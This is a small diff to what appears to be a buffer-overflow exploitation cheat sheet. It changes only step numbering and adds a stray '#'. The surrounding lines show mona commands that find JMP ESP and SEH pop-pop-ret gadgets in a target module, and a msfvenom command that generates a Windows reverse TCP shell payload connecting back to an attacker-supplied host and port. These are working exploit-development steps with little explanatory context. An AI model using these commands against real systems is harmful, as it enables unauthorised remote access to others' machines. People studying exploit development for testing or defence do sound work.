@@ -54,11 +54,12 @@ msf-nasm_shell
 ```
 !mona find -s "\xff\xe4" -m "suspectmodule.dll"
 ```
+#
   9. find "pop,pop,ret" for SEH
 ```
 !mona seh -m "$module"
 ```
-  9. generate Windows reverse shell
+  10. generate Windows reverse shell
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f c -e x86/shell -b "\x00"
 ```
